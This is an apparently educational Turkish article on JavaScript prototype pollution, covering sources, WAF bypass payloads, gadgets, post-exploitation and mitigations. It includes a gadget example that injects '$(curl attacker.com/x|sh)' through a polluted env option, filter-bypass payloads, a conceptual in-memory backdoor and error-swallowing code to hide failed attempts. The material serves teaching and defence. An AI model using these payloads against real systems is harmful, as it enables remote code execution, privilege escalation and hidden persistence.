**Prototype Pollution**, JavaScript'in en temel mimari özelliğinden — prototip tabanlı kalıtımdan — doğan, ama sonuçları itibarıyla klasik bir web zafiyetinden çok daha derin olan bir güvenlik sınıfıdır. Kök neden basit görünür: bir uygulama, kullanıcı girdisinden gelen bir nesneyi (JSON body, query string, YAML, dosya) **kontrolsüzce** başka bir nesneyle birleştirir (`merge`, `extend`, `clone`, `assign`) ve bu işlem sırasında `__proto__` gibi özel bir anahtar, hedef nesnenin **kendi prototipine** yazma imkânı bulur. Sonuç, tek bir isteğin **tüm uygulamanın** her nesnesini aynı anda etkileyebilmesidir — çünkü `Object.prototype`, JavaScript'te neredeyse her şeyin ortak atasıdır.

Bu yazı, konuyu bir SAST aracının yakalayabileceği yüzeysel seviyeden alıp, **V8 motorunun bellek modeline**, **gadget avcılığına**, **WAF/filtre atlatma tekniklerine** ve **bellek-içi kalıcılığa** kadar uzman seviyesinde derinleştiriyor.

---

## 1. Temel Kavramlar: Prototip Zinciri ve V8 Mimarisi

### 1.1 Prototip Zinciri (Prototype Chain)

JavaScript'te her nesne, `[[Prototype]]` adı verilen gizli bir bağlantı (internal slot) üzerinden başka bir nesneye referans verir. Bir property'ye erişildiğinde, JS motoru önce nesnenin **kendi** property'lerine bakar; bulamazsa zincirdeki bir üst prototipe, o da bulamazsa bir üst prototipe çıkar — bu zincir sonunda **`Object.prototype`**'a ulaşır, ki bu da `null` prototipe sahiptir (zincirin sonu).

```javascript
const obj = {};
console.log(obj.toString); // Object.prototype'dan miras alınır
console.log(obj.__proto__ === Object.prototype); // true
```

`Object.prototype`'ın özel konumu şudur: **hemen hemen her literal nesne, dizi ve fonksiyon** (aksi belirtilmedikçe) bu prototipten türer. Bu yüzden `Object.prototype`'a yazılan bir property, teorik olarak **tüm uygulamadaki her nesnede** aniden "var" olur.

**Savunma amaçlı istisna:** `Object.create(null)` ile oluşturulan bir nesnenin `[[Prototype]]`'ı `null`'dır — zincire hiç bağlı değildir, dolayısıyla `Object.prototype` kirlenmiş olsa bile bu nesneler etkilenmez. Bu, ileride Bölüm 8'de göreceğimiz gibi **en güvenilir savunma tekniklerinden biridir.**

### 1.2 V8 İç Mekanizmaları: Hidden Classes ve Dictionary Mode

V8, performans için nesneleri düz bir hash map olarak değil, **Hidden Class (Shape/Map)** adı verilen bir yapı üzerinden tutar — aynı property setine ve sırasına sahip nesneler aynı Hidden Class'ı paylaşır, bu da property erişimini (JIT tarafından) sabit ofsetli bellek okumasına indirger.

Ancak bir nesneye **runtime'da dinamik olarak** property eklenip silindiğinde (özellikle prototip zincirinin ortasına, beklenmedik bir noktaya bir property enjekte edildiğinde), V8 bu nesneyi **Dictionary Mode**'a (yavaş, hash-map tabanlı bir moda) düşürebilir. Prototype pollution saldırıları, tam olarak bu mekanizmayı istismar eder: `Object.prototype`'a **runtime'da** bir property eklemek, o prototipi kullanan **tüm nesnelerin Hidden Class zincirini** geçersiz kılar ve V8'i optimize edilmemiş, "her ihtimale karşı prototip zincirini tekrar tekrar tarayan" bir moda zorlar. Bu, saldırının **fonksiyonel etkisinin ötesinde**, uygulamanın genelinde ölçülebilir bir performans düşüşüne (kirlenme sonrası ani yavaşlama) de yol açabilir — bu durum bazı tespit tekniklerinde (Bölüm 9) bir yan kanal olarak kullanılır.

### 1.3 Property Descriptors

Her property, sadece bir değer değil, bir **descriptor** taşır:

```javascript
Object.defineProperty(Object.prototype, 'isAdmin', {
  value: false,
  writable: false,     // yeniden atanamaz
  enumerable: false,   // for...in ile görünmez
  configurable: false  // silinemez, yeniden tanımlanamaz
});
```

Bir property `writable: false` ile korunuyorsa, klasik `obj.__proto__.isAdmin = true` ataması **sessizce başarısız olur** (strict mode'da hata fırlatır). Bu, geliştiricilerin bazen "savunma" niyetiyle kullandığı bir yöntemdir — ama Bölüm 5'te göreceğimiz gibi, bu koruma **kolayca delinebilir**, çünkü koruma sadece o **tek property** için geçerlidir, prototipin kendisi için değil.

### 1.4 Proxy ve Reflect API

`Proxy`, bir nesnenin temel işlemlerini (property okuma, yazma, silme) **yakalayıp özelleştirmeye** izin verir:

```javascript
const handler = {
  set(target, prop, value) {
    console.log(`Yazılıyor: ${String(prop)} = ${value}`);
    return Reflect.set(target, prop, value);
  }
};
const proxiedProto = new Proxy(Object.prototype, handler);
```

Bu API, hem **saldırı tespitinde** (hangi kütüphanenin prototipe ne zaman yazdığını canlı izlemek — Bölüm 9) hem de **teorik savunmada** (prototip erişimini bir Proxy arkasına alıp anomalileri loglamak/engellemek) kritik bir rol oynar.

---

## 2. Node.js İç Mimarisi

Bir Node.js uygulamasında çalışan kod, sadece geliştiricinin yazdığı satırlardan ibaret değildir — arkada devasa bir **built-in kütüphane havuzu** (`lib/` klasöründeki `child_process`, `fs`, `http`, `vm`, `cluster` gibi modüller) çalışır ve bu modüllerin büyük kısmı, **options nesnesi** adı verilen, kullanıcı tarafından özelleştirilebilen konfigürasyon nesneleri kabul eder.

```javascript
// Node.js internals kabaca şöyle çalışır (basitleştirilmiş)
function spawn(command, args, options = {}) {
  const shell = options.shell || defaultShell();
  const env = options.env || process.env;
  // ...
}
```

Kritik nokta şu: `options.shell` veya `options.env` **doğrudan** çağrı sırasında verilmemişse, JavaScript motoru bu değerleri **prototip zincirinden** okumaya çalışır. Eğer `Object.prototype.shell` kirlenmişse, `options.shell` boş bir nesne için bile **"tanımlı"** hale gelir — çünkü zincir tırmanışı `Object.prototype`'a kadar çıkar ve orada bir değer bulur.

`process.env`, `global`, `module.exports` gibi global yapılar da aynı prototip zincirine bağlıdır — bu yüzden kirlenme, sadece uygulamanın kendi nesnelerini değil, **Node.js'in çalışma zamanı ortamının kendisini** de etkileyebilir.

---

## 3. Kirlenme Kaynakları (Sources)

### 3.1 Tehlikeli Fonksiyon Kalıpları

Prototype pollution'ın klasik giriş noktası, **recursive (özyinelemeli) merge/clone/extend** fonksiyonlarıdır:

```javascript
// ❌ Riskli: anahtar ismi kontrol edilmeden hedef nesneye yazılıyor
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // recursive
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

```json
{ "__proto__": { "isAdmin": true } }
```

`merge({}, JSON.parse(payload))` çağrıldığında, `key === "__proto__"` olduğunda `target["__proto__"]` erişimi **hedef nesnenin prototipini** işaret eder (çünkü `__proto__`, tarihsel olarak `[[Prototype]]`'a erişim sağlayan bir accessor property'dir) — ve `merge` fonksiyonu bu prototipin içine `isAdmin: true` yazar. Artık `{}` gibi **tamamen boş, ilgisiz bir nesne bile** `.isAdmin === true` döner.

### 3.2 Derin JSON/URL Parsing Anormallikleri

Standart bir `__proto__` filtresi (`if (key === '__proto__') continue;`) genellikle **birebir string eşleşmesine** dayanır — bu, encoding varyasyonlarıyla kolayca atlatılabilir:

```
__proto__          → doğrudan
%5f%5fproto%5f%5f  → URL encoded (__proto__)
%255f%255fproto...  → double URL encoded
\u005f\u005fproto\u005f\u005f  → Unicode kaçış dizisi
```

Parser, veriyi decode ettikten **sonra** filtreleme yapıyorsa, encoding farkı bir sorun değildir — ama filtreleme decode'dan **önce**, ham string üzerinde yapılıyorsa (örneğin bir WAF kuralı, request body'yi henüz JSON.parse etmeden regex ile taraması), bu encoding varyasyonları **filtreyi tamamen görünmez şekilde** atlatır.

### 3.3 Query String Parsing (qs / querystring / minimist)

`qs` gibi kütüphaneler, `a[b][c]=d` formatındaki flat string'leri **iç içe geçmiş (nested) nesnelere** dönüştürür:

```
?a[__proto__][isAdmin]=true
```

Bu formatta gönderilen bir query string, `qs.parse()` tarafından işlendiğinde eski sürümlerde doğrudan `{ a: { __proto__: { isAdmin: true } } }` benzeri bir yapıya dönüşebiliyordu — kütüphanenin kendisi, kullanıcı girdisinden **prototip zincirine erişim sağlayan** bir parser haline geliyordu. Farklı kütüphanelerin (`qs`, `querystring`, `minimist`) nested-object oluşturma mantığındaki küçük **edge-case farkları**, her birinde ayrı ayrı test edilmesi gereken ayrı saldırı yüzeyleri oluşturur.

### 3.4 Alternatif Formatlar

Prototype pollution kaynağı sadece HTTP POST JSON body ile sınırlı değildir:

* **YAML parsing:** `js-yaml` gibi kütüphanelerin eski sürümlerinde, YAML içindeki özel tip etiketleri (`!!js/object`) veya nested key yapıları prototipe erişim sağlayabiliyordu.
* **XML-to-JSON dönüştürücüler:** XML'i JSON'a çeviren ara katmanlar, XML element isimlerini doğrudan JS key'lerine map ederken `__proto__` ismini filtrelemeyebilir.
* **TOML parser'lar:** Daha az yaygın olsa da aynı nested-key mantığı geçerlidir.
* **JWT header/payload işleme:** JWT'nin decode edilen payload'ı bir merge/extend işlemine tabi tutuluyorsa (örneğin kullanıcı context'ine "birleştiriliyor" ise), token içeriği üzerinden kirlenme mümkündür.

### 3.5 Dosya Yükleme Üzerinden Kirlenme (CSV/Excel)

Sunucu tarafında Excel/CSV dosyalarını okuyup JSON nesnesine dönüştüren kütüphaneler (`xlsx`, `csv-parser`), dosyanın **başlık satırındaki hücre değerlerini** doğrudan nesne anahtarı olarak kullanabilir:

```csv
__proto__,isAdmin
value,true
```

Bu, klasik "kullanıcı girdisi = JSON body" varsayımının **tamamen dışında** kalan, çoğu zaman gözden kaçan bir saldırı yüzeyidir — çünkü güvenlik ekipleri genellikle dosya yükleme güvenliğini "kötü amaçlı dosya türü" (webshell, exe) açısından değerlendirir, "CSV hücresi prototip kirletir mi?" sorusunu sormaz.

---

## 4. Filtre ve WAF Atlatma Teknikleri

### 4.1 Anahtar Kelime Filtresi Atlatma

`__proto__` kelimesi engellendiğinde, aynı prototipe **farklı bir isimle** erişmek mümkündür:

```json
{ "constructor": { "prototype": { "isAdmin": true } } }
```

Her fonksiyonun (ve fonksiyon olan her sınıfın) bir `constructor` property'si vardır ve bu constructor'ın `prototype` property'si, o sınıftan türeyen tüm nesnelerin ortak prototipidir. `obj.constructor.prototype`, çoğu durumda `obj.__proto__` ile **aynı nesneye** ulaşır — sadece filtre `"__proto__"` string'ini arıyorsa, bu yol tamamen görünmez kalır.

### 4.2 `Object.defineProperty` Koruması Delme

Geliştiriciler bazen şu şekilde bir "koruma" ekler:

```javascript
Object.defineProperty(Object.prototype, '__proto__', {
  writable: false,
  configurable: false
});
```

Bu, **sadece `__proto__` accessor'ının kendisini** korur — `Object.prototype` üzerindeki **diğer** property'ler (`toString`, `valueOf`, `hasOwnProperty`) veya diğer built-in sınıfların prototipleri (`Array.prototype`, `Function.prototype`) hâlâ tamamen açıktır:

```json
{ "constructor": { "prototype": { "toString": "polluted" } } }
```

Saldırgan, `Object.prototype.__proto__`'yu değil, doğrudan `Object.prototype.toString`'i veya `Array.prototype`'ı kirletmeyi hedefleyerek bu "yarım" korumayı bypass eder. Gerçek bir savunma, **tüm** `Object.prototype`'ı `Object.freeze(Object.prototype)` ile dondurmayı gerektirir — bu bile (Bölüm 4.3'te göreceğimiz gibi) her senaryoyu kapatmaz.

### 4.3 Kirlenme ile Kirlenme (Pollution via Pollution)

En sofistike bypass tekniği, **iki aşamalı zincirleme**dir: ilk istek, uygulamanın **filtreleme fonksiyonunun kendisinin** davranışını değiştirecek bir kirlenme yapar (örneğin filtre fonksiyonunun kullandığı bir yardımcı değişkeni veya bir regex flag'ini kirletir), ikinci istek ise artık etkisizleşmiş bu filtreyi kullanarak **asıl RCE kirlenmesini** gerçekleştirir. Bu teknik, statik analiz araçlarının "tek isteklik" bir istismar modeli varsaydığı durumlarda özellikle tespit edilmesi zor bir saldırı yüzeyi oluşturur.

---

## 5. Gadget Avcılığı (Advanced Gadget Hunting)

Prototip kirlenmesi **tek başına** sadece bir nesneyi "bozar" — gerçek etkisi, kirlenen değerin **nerede, nasıl okunduğuna** bağlıdır. Bu okuma noktasına **gadget** denir, ve 0-day araştırmasının asıl değeri gadget avcılığındadır.

### 5.1 Node.js Built-in Gadget'ları

```javascript
// Kirlenme
Object.prototype.shell = true;
Object.prototype.env = { EVIL: "$(curl attacker.com/x|sh)" };

// Savunmasız kod: options nesnesi boş görünür ama prototipten "shell" ve "env" okunur
const { spawn } = require('child_process');
spawn('some-command', [], {}); // options = {} ama shell/env prototipten geliyor
```

`child_process.spawn()`'ın `options.shell` alanı `true` olduğunda, komut bir shell üzerinden çalıştırılır — bu, shell metakarakterlerinin (`;`, `|`, `` ` ``, `$()`) yorumlanmasını etkinleştirir ve komut enjeksiyonu için kapı açar. Sistematik gadget avcılığı, Node.js'in `lib/` klasöründeki her modülün (`fs`, `http`, `cluster`, `vm`) **options nesnesi kabul eden ve default değeri olmayan** her parametresini haritalamayı gerektirir — bu genellikle Node.js kaynak kodunun (`lib/internal/child_process.js` gibi dosyaların) manuel taranmasıyla yapılır.

### 5.2 Template Engine Hijacking

Şablon motorları (EJS, Pug, Handlebars, Nunjucks), derleme (compile) sürecinde **kendi iç ayarlarını** (örneğin `client`, `escape`, `compileDebug`, `localsName` gibi seçenekleri) options nesnesinden okur:

```javascript
// EJS render sürecinin basitleştirilmiş mantığı
const opts = Object.assign({}, defaultOptions, userOptions);
if (opts.client) {
  // "client" modunda derlenen şablon, farklı bir kod üretim yoluna girer
}
```

Bazı şablon motoru sürümlerinde, `outputFunctionName` veya `escapeFunction` gibi **derleme zamanı davranışını belirleyen** seçenekler prototipten kirletilebiliyorsa, şablon derlenirken **saldırganın kontrol ettiği JavaScript kodu** üretilen fonksiyonun içine enjekte edilebiliyordu — bu, prototype pollution'ın **Server-Side Template Injection (SSTI)**'ye dönüşmesinin klasik yoludur, ve doğrudan RCE ile sonuçlanır.

### 5.3 NPM Ekosistemi "Genel" Gadget'ları

Kurumsal projelerde yaygın kullanılan kütüphaneler, arka planda prototipten okuyabilecek konfigürasyon parametreleri barındırabilir:

* **AWS SDK / Firebase Admin SDK:** İstek imzalama, endpoint URL'si veya credential path'i gibi ayarların prototipten okunması, saldırganın **isteklerin nereye gittiğini** yönlendirmesine yol açabilir.
* **Nodemailer:** SMTP host/port/auth bilgilerinin prototipten okunması, e-posta trafiğinin saldırgan kontrolündeki bir sunucuya yönlendirilmesine (credential harvesting) neden olabilir.
* **Sequelize / Mongoose (ORM'ler):** Sorgu opsiyonlarının (`raw`, `attributes`, `where` operatörleri) prototipten kirletilmesi, NoSQL/SQL enjeksiyonuna veya yetkilendirme filtrelerinin atlatılmasına (bkz. Broken Access Control yazımızdaki NoSQL operatör enjeksiyonu bölümü) yol açabilir.
* **TLS doğrulama bayrakları:** `rejectUnauthorized: false` gibi bir değerin prototipten "sızması", tüm giden HTTPS isteklerinde **sertifika doğrulamasının sessizce devre dışı kalmasına** ve MITM'e açık hale gelmesine neden olabilir.

Bu kategori özellikle tehlikelidir çünkü gadget, saldırganın **doğrudan hedeflediği** kod değil, **üçüncü taraf bir bağımlılığın içinde gömülü**, geliştiricinin haberi bile olmayan bir davranıştır.

---

## 6. Post-Exploitation ve Kalıcılık

### 6.1 Sessiz Çalıştırma (Muted Execution)

Bir exploit denemesi başarısız olduğunda veya yanlış bir gadget tetiklendiğinde, Node.js process'i çökebilir (`uncaughtException`) — bu, hem operasyonu ifşa eder hem de tekrar deneme fırsatını ortadan kaldırabilir (process restart edildiğinde kirlenme sıfırlanır). Sofistike bir saldırgan, önce hata yönetimini manipüle eder:

```javascript
process.on('uncaughtException', (err) => {
  // hatayı yut, process'in çökmesini engelle
});
```

Bu satır, prototip zincirine yazılan bir property üzerinden (örneğin bir event emitter gadget'ı ile) enjekte edilebilirse, sonraki exploit denemeleri **sessizce** başarısız olabilir ve loglara düşmeyebilir — klasik bir "iz bırakmama" tekniği.

### 6.2 Prototip Tabanlı Backdoor (Bellek İçi Kalıcılık)

En sofistike senaryo, **hiçbir dosyanın diske yazılmadığı** bir backdoor'dur. Express.js/NestJS gibi framework'lerin router mekanizması veya HTTP request işleme zinciri, iç yapılarında prototip tabanlı middleware zincirleri kullanır:

```javascript
// Kavramsal: router prototipine gizli bir middleware enjekte etme
Object.prototype.__proto__.use = function(originalUse) {
  return function(path, handler) {
    if (path === '/secret-backdoor') {
      return handler(req, res); // her zaman çalıştır, auth kontrolü atla
    }
    return originalUse.call(this, path, handler);
  };
};
```

Bu tür bir kirlenme, process **yeniden başlatılmadığı sürece** bellekte kalıcıdır ve dosya sistemi tabanlı hiçbir antivirüs/EDR taraması tarafından tespit edilemez — çünkü ortada "kötü amaçlı bir dosya" yoktur, sadece çalışan bir process'in **bellek içi durumu** değişmiştir.

### 6.3 Session/Auth Manipülasyonu

Kimlik doğrulama kütüphaneleri, kullanıcı rolünü/yetkisini kontrol ederken sıklıkla basit bir property kontrolüne dayanır:

```javascript
// ❌ Riskli: role kontrolü prototip zincirinden etkilenebilir
function isAdmin(user) {
  return user.role === 'admin' || user.isAdmin;
}
```

`Object.prototype.isAdmin = true` şeklindeki bir kirlenme, **hiçbir kullanıcı nesnesinde `isAdmin` property'si tanımlı olmasa bile**, her `user.isAdmin` erişiminin `true` dönmesine neden olur — bu, tek bir HTTP isteğiyle **sistemdeki her oturumu** aynı anda admin yetkisine yükseltebilen, klasik bir dikey privilege escalation senaryosudur.

---

## 7. Otomasyon ve Özel Araç Geliştirme

### 7.1 AST (Abstract Syntax Tree) Tabanlı Statik Analiz

Milyonlarca satır kodu elle taramak pratik değildir. `Babel`, `Esprima` veya `Acorn` gibi parser'lar, JavaScript kodunu bir **ağaç yapısına (AST)** dönüştürür ve bu ağaç üzerinde programatik arama yapılabilir:

```javascript
const parser = require('@babel/parser');
const traverse = require('@babel/traverse').default;

const ast = parser.parse(sourceCode);
traverse(ast, {
  AssignmentExpression(path) {
    // obj[a][b] = c gibi computed member expression atamalarını yakala
    if (path.node.left.type === 'MemberExpression' &&
        path.node.left.computed) {
      console.log('Potansiyel tehlikeli atama:', path.node.loc);
    }
  }
});
```

Bu yaklaşım, `merge()`, `extend()`, `clone()` gibi fonksiyonların **recursive ve anahtar kontrolsüz** olduğu kod bloklarını otomatik olarak işaretlemek için kullanılır.

### 7.2 Semgrep/CodeQL ile Kurumsal SAST Kuralları

```yaml
# Basitleştirilmiş Semgrep kural mantığı
rules:
  - id: prototype-pollution-merge
    patterns:
      - pattern: |
          function $FUNC($TARGET, $SOURCE) {
            for (... in $SOURCE) {
              $TARGET[$KEY] = $SOURCE[$KEY]
              ...
            }
          }
      - pattern-not: |
          if ($KEY === "__proto__" || $KEY === "constructor") { ... }
    message: "Anahtar kontrolü olmayan recursive merge fonksiyonu tespit edildi"
    severity: WARNING
```

Bu tür kurallar, açık kaynaklı bağımlılıkların **tamamını** (node_modules dahil) tarayarak, henüz CVE numarası almamış "genel" gadget'ları proaktif olarak tespit etmek için kullanılır.

### 7.3 Dinamik Analiz — Runtime Proxy ile Canlı İzleme

Statik analiz her zaman yeterli değildir (dinamik property erişimi, `eval`, string birleştirmeli key erişimi gibi kalıplar statik olarak yakalanamayabilir). Bunun yerine, `Object.prototype`'a **çalışma zamanında** bir izleme katmanı eklenebilir:

```javascript
const originalDescriptors = Object.getOwnPropertyDescriptors(Object.prototype);

for (const key of ['shell', 'env', 'isAdmin', '__proto__']) {
  Object.defineProperty(Object.prototype, key, {
    get() {
      console.trace(`[GADGET TESPİTİ] Okuma: Object.prototype.${key}`);
      return undefined;
    },
    set(value) {
      console.trace(`[KİRLENME TESPİTİ] Yazma: Object.prototype.${key} = ${value}`);
    },
    configurable: true
  });
}
```

Bu tür bir "tuzak" katmanı, hangi kütüphanenin **hangi satırda** prototipten veri okumaya çalıştığını `console.trace()` çıktısıyla (call stack dahil) canlı olarak yakalar — gadget avcılığında en pratik yöntemlerden biridir.

### 7.4 Headless Browser Fuzzing (Client-Side → Server-Side)

DOM tabanlı prototip kirlenmeleri (örneğin `location.hash`'ten okunan bir değerin client-side bir merge fonksiyonuna verilmesi), Puppeteer/Playwright ile otomatikleştirilmiş bir fuzzer içinde taranabilir — bu fuzzer, farklı URL fragment/query varyasyonlarını dener ve sayfa üzerinde **beklenmeyen davranış** (network isteklerinin değişmesi, DOM'un beklenmedik şekilde render edilmesi) oluşup oluşmadığını otomatik tespit eder. Client-side'da başlayan bir kirlenme, aynı sayfa daha sonra sunucuya bir istek attığında (örneğin bir SSR hydration sürecinde) **server-side bir gadget'a** ulaşabilir — bu, client-side ve server-side prototype pollution'ın **zincirlendiği** nadir ama kritik bir senaryodur.

---

## 8. Tespit Metodolojisi

1. **Kaynak haritalama:** Uygulamadaki tüm recursive merge/clone/extend fonksiyonlarını (kendi kodunuz + bağımlılıklar) çıkar.
2. **Kirlenme testi:** `__proto__`, `constructor.prototype` ve encoding varyasyonlarıyla (`%5f%5fproto%5f%5f`, `\u005f\u005fproto\u005f\u005f`) her giriş noktasına (JSON, query string, YAML, CSV) payload gönder.
3. **Etkiyi doğrula:** Ayrı, ilgisiz bir istekte `({}).polluted === beklenen_değer` kontrolü yaparak kirlenmenin kalıcı olduğunu doğrula (out-of-band veya delayed confirmation).
4. **Gadget arama:** Kirletilen property isimlerini, uygulamanın kullandığı framework/kütüphanelerin kaynak kodunda (`node_modules`) ara — hangi options nesnesi bu ismi okuyor?
5. **Filtre atlatma testi:** `__proto__` engelliyse `constructor.prototype` dene; tek property korunuyorsa `Object.prototype`'ın diğer property'lerini hedefle.
6. **Runtime izleme:** Mümkünse (staging ortamında) Bölüm 7.3'teki proxy/getter-setter tuzağını kurup gerçek gadget'ları canlı yakala.
7. **Zincir testi:** Tek istekle kirlenme başarısızsa, iki aşamalı "kirlenme ile kirlenme" senaryosunu dene.

---

## Virtual Patch — Acil Durum Yaması

Bir üründe prototype pollution zafiyeti tespit edildiğinde, kod tabanının tamamını (tüm merge/clone fonksiyonlarını) gözden geçirmek zaman alır. Saatler içinde uygulanabilecek geçici önlemler:

**1. `Object.prototype`'ı Anında Dondurma**

En hızlı ve en geniş kapsamlı acil önlem — uygulama başlangıcında (entry point'te) çalıştırılır.

```javascript
// ✅ Acil patch: Object.prototype ve diğer kritik prototipler donduruluyor
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
```

`Object.freeze()`, prototipe yeni property eklenmesini, var olanların değiştirilmesini veya silinmesini **tamamen engeller**. Dikkat: bu, meşru kodun `Object.prototype`'a runtime'da bir şey eklemesini de engeller — bu nadir bir pattern olduğu için genellikle güvenli bir acil önlemdir, ama devreye almadan önce regresyon testi şarttır.

**2. Gateway/Middleware Seviyesinde Girdi Temizleme**

Kod tabanına dokunmadan, tüm gelen JSON body'lerin en başında tehlikeli anahtarları temizleyen bir middleware eklenir.

```javascript
const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];

function sanitizeInput(req, res, next) {
  const clean = (obj) => {
    if (obj && typeof obj === 'object') {
      for (const key of Object.keys(obj)) {
        if (DANGEROUS_KEYS.includes(key)) {
          delete obj[key];
        } else {
          clean(obj[key]);
        }
      }
    }
    return obj;
  };
  req.body = clean(req.body);
  next();
}
app.use(sanitizeInput); // tüm route'lardan önce çalışır
```

**3. Null-Prototip Nesnelerle Çalışma (Hedefli Acil Düzeltme)**

En kritik merge/config nesneleri, acil olarak `Object.create(null)` ile oluşturulacak şekilde değiştirilir — bu nesnelerin prototip zinciri hiç yoktur, dolayısıyla kirlenmeden etkilenmezler.

```javascript
// ✅ Acil patch: kritik config nesnesi zincire hiç bağlı değil
const safeConfig = Object.create(null);
Object.assign(safeConfig, userProvidedConfig);
```

**4. Map Kullanımına Acil Geçiş**

Kullanıcı girdisinden gelen anahtar-değer verisi tutan en kritik noktalarda, düz nesne yerine `Map` kullanılır — `Map`'in prototip zinciriyle bu şekilde bir etkileşimi yoktur ve `__proto__` özel bir anlam taşımaz.

```javascript
// ✅ Acil patch: kullanıcı verisi Map'te tutuluyor, prototip zincirine dokunmuyor
const userSettings = new Map();
for (const [key, value] of Object.entries(untrustedInput)) {
  userSettings.set(key, value);
}
```

**5. Node.js Süreç Bayrağıyla Ek Güvenlik**

Node.js 16.9+ sürümlerinde, `--disable-proto` bayrağı ile `__proto__` accessor'ı motor seviyesinde tamamen devre dışı bırakılabilir — bu, uygulama kodunun tamamını değiştirmeden, çalışma zamanı seviyesinde geniş bir koruma sağlar.

```bash
node --disable-proto=throw app.js
```

`throw` modu, `__proto__` erişim denemesinde hata fırlatır (saldırıyı loglara düşürür); `delete` modu ise sessizce `undefined` döner.

**Dikkat edilmesi gerekenler:**

* `Object.freeze(Object.prototype)` gibi geniş kapsamlı önlemler **meşru kodu da etkileyebilir** — devreye almadan önce staging ortamında kapsamlı regresyon testi yapılmalı.
* Middleware seviyesindeki anahtar temizleme, **sadece HTTP JSON body** için çalışır; YAML, CSV, WebSocket mesajları gibi diğer giriş noktaları ayrıca kapatılmalıdır.
* `constructor.prototype` gibi alternatif erişim yollarının da middleware'de filtrelendiğinden emin olunmalı — sadece `__proto__` filtrelemek yeterli değildir (bkz. Bölüm 4.1).
* Yama sonrası, kirlenmenin **zaten gerçekleşmiş olabileceği** ihtimaline karşı (patch öncesi bir saldırı zaten başarılı olduysa) etkilenen process'lerin **yeniden başlatılması** gerekir — bellek içi kirlenme, kod güncellenmiş olsa bile çalışan process'te kalıcıdır.

---

## Kalıcı Çözümler

**Kod Seviyesi:** Tüm recursive merge/clone/extend fonksiyonları, anahtar ismini `__proto__`, `constructor`, `prototype` değerlerine karşı **explicit olarak** kontrol etmeli veya bu işlemler için güvenliği kanıtlanmış, güncel kütüphaneler (Lodash'ın güncel `merge`/`mergeWith` sürümleri, `deepmerge` gibi) tercih edilmeli.

**Mimari Seviye:** Kullanıcı girdisinden türeyen konfigürasyon/ayar nesneleri mümkün olduğunca `Object.create(null)` veya `Map` ile tutulmalı; `Object.prototype` uygulama başlangıcında dondurulmalı (regresyon testiyle doğrulanarak).

**Bağımlılık Yönetimi:** `npm audit`/`Snyk` gibi araçlarla bağımlılıklardaki bilinen prototype pollution CVE'leri düzenli taranmalı; kritik bağımlılıklar (Lodash, qs, js-yaml gibi geçmişte bu tür açıklar barındırmış kütüphaneler) güncel tutulmalı.

**Runtime Koruması:** Node.js'in `--disable-proto` bayrağı production ortamında etkinleştirilmeli; mümkünse `Proxy` tabanlı bir izleme katmanı ile prototipe yapılan anormal yazma girişimleri gerçek zamanlı loglanmalı/alarma bağlanmalı.

**Geliştirme Süreci:** AST tabanlı statik analiz (Semgrep/CodeQL kuralları) CI/CD pipeline'ına entegre edilmeli; her yeni bağımlılık, özellikle options nesnesi kabul eden ve default değeri olmayan parametreler açısından incelenmeli.

---

## Yaygın Senaryolar

* Recursive merge ile temel kirlenme
  `{"__proto__": {"isAdmin": true}}` → tüm nesnelerde `isAdmin === true`

* Query string üzerinden nested object kirlenmesi
  `?a[__proto__][isAdmin]=true` (qs/querystring parser farkları)

* Filtre atlatma — alternatif erişim yolu
  `{"constructor": {"prototype": {"isAdmin": true}}}`

* `child_process.spawn` gadget'ı ile RCE
  `Object.prototype.shell = true` → options.shell prototipten okunuyor

* Template engine hijacking ile SSTI/RCE
  Derleme zamanı ayarlarının (`outputFunctionName` vb.) kirletilmesi

* Bellek içi, dosyasız backdoor
  Router/middleware prototipinin kirletilerek gizli endpoint eklenmesi

* NPM ekosistemi gadget'ı ile TLS bypass
  `rejectUnauthorized: false` değerinin prototipten sızması → MITM'e açık istekler

* CSV/Excel başlık satırı üzerinden kirlenme
  `__proto__,isAdmin` başlıklı bir dosyanın sunucuda parse edilmesi

---
